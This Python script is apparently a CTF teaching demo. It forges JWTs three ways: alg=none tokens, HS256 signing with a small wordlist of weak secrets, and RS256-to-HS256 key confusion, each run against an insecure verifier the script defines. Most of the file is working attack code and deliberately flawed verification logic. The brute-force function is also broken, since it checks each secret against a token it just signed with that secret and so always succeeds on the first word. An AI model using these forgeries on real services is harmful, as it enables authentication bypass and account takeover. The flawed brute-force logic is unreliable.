
# jwt_attack_demo.py
# PoC JWT attacks for CTF assignment
# Demonstrates:
# 1) alg=none exploitation against an insecure verifier
# 2) Weak-secret brute-force forging (HS256)
# 3) Key-confusion RS256 -> HS256 attack
#
# Notes: This file is for educational/CTF purposes only.

import jwt
import time
import hashlib
import hmac
from jwt import PyJWKClient
from base64 import urlsafe_b64encode, urlsafe_b64decode
import json

# Helper: pretty print token parts
def split_token(token):
    header_b64, payload_b64, sig_b64 = token.split('.')
    def dec(x):
        pad = '=' * (-len(x) % 4)
        return json.loads(urlsafe_b64decode(x + pad).decode())
    return dec(header_b64), dec(payload_b64), sig_b64

# 1) alg=None PoC (works only if verifier unsafely allows 'none' or trusts alg from token)
def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    token = f"{header_b64}.{payload_b64}."
    return token

# insecure_verify_none simulates a vulnerable server that accepts alg from token and
# if alg=='none' skips signature checks (BAD).
def insecure_verify_none(token):
    header, payload, sig = split_token(token)
    if header.get("alg") == "none":
        print("[insecure_verify_none] WARNING: accepting alg=none without verification")
        return payload
    else:
        raise Exception("Expected alg none for this demo")

# 2) Weak-secret brute force (HS256)
def forge_hs256_with_wordlist(payload, wordlist):
    for secret in wordlist:
        t = jwt.encode(payload, key=secret, algorithm="HS256")
        # verify using same secret to test
        try:
            decoded = jwt.decode(t, key=secret, algorithms=["HS256"])
            # if decode succeeds with the secret, we "forged" a valid token for that secret
            return t, secret
        except Exception:
            continue
    return None, None

# 3) Key confusion: RS256 -> HS256 attack
# Attack scenario:
# - Server accepts algorithm specified in token header and uses the RSA public key as a HMAC secret (misconfiguration).
# - Attacker gets server's public key (often exposed) and uses it as HMAC secret to sign with HS256.
#
# Here we simulate by creating an RS keypair and showing how a forged HS256 token using the public key will verify
# if the server misuses the public key as HMAC secret.
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

def generate_rsa_keypair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ).decode()
    public_key = private_key.public_key()
    pub_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode()
    return priv_pem, pub_pem

def create_rs256_token(payload, private_pem):
    token = jwt.encode(payload, private_pem, algorithm="RS256")
    return token

def forge_hs256_using_public_as_secret(payload, public_pem):
    # treat public_pem (string) as HMAC secret
    token = jwt.encode(payload, key=public_pem, algorithm="HS256")
    return token

# Simulated vulnerable verifier which:
# - fetches server's "public_key" from configuration and then:
# - if header.alg == "HS256", uses the HMAC secret from config
# - if header.alg == "RS256", uses RS256 verification with stored public key
# - BUT there's a misconfiguration: when token declares alg=HS256, the server uses the RSA public key (string)
#   as the HMAC secret. This allows the key-confusion attack.
def vulnerable_verify_key_confusion(token, rsa_public_pem, hmac_secret):
    header, payload, sig = split_token(token)
    alg = header.get("alg")
    if alg == "RS256":
        # normal verification
        return jwt.decode(token, rsa_public_pem, algorithms=["RS256"])
    elif alg == "HS256":
        # misconfigured path: server uses rsa_public_pem (instead of hmac_secret)
        try:
            return jwt.decode(token, rsa_public_pem, algorithms=["HS256"])
        except Exception as e:
            raise
    else:
        raise Exception("Unsupported alg in this demo")

if __name__ == "__main__":
    print("\n=== Demo: alg=none ===")
    payload = {"user": "victim", "role": "user", "exp": int(time.time()) + 3600}
    none_token = create_none_token(payload)
    print("Created alg=none token:", none_token)
    print("Insecure verify result:", insecure_verify_none(none_token))

    print("\n=== Demo: brute-force weak HS256 secret ===")
    common_secrets = ['password', 'secret', 'jwtsecret', '123456', 'admin', 'letmein']
    payload2 = {"user": "admin", "role": "admin", "exp": int(time.time()) + 3600}
    forged, found = forge_hs256_with_wordlist(payload2, common_secrets)
    if forged:
        print(f"Forged HS256 token with weak secret '{found}':\n{forged}")
        print("Decoded:", jwt.decode(forged, key=found, algorithms=['HS256']))
    else:
        print("No secret found in tiny wordlist demo")

    print("\n=== Demo: RS256 -> HS256 key confusion ===")
    priv, pub = generate_rsa_keypair()
    rs_token = create_rs256_token({"user":"service","role":"service","exp":int(time.time())+3600}, priv)
    print("Legitimate RS256 token (signed with private key):", rs_token)
    # Attacker forges HS256 using public PEM as secret
    forged_hs = forge_hs256_using_public_as_secret({"user":"attacker","role":"admin","exp":int(time.time())+3600}, pub)
    print("Forged HS256 token using public key as HMAC secret:", forged_hs)
    try:
        print("Vulnerable verify of forged HS256 (using public key as HMAC secret):")
        print(vulnerable_verify_key_confusion(forged_hs, rsa_public_pem=pub, hmac_secret='SOME_REAL_HMAC_SECRET'))
    except Exception as e:
        print("Verification failed (in a correctly-configured server). If server used public key as HMAC secret, it would succeed. Error:", e)
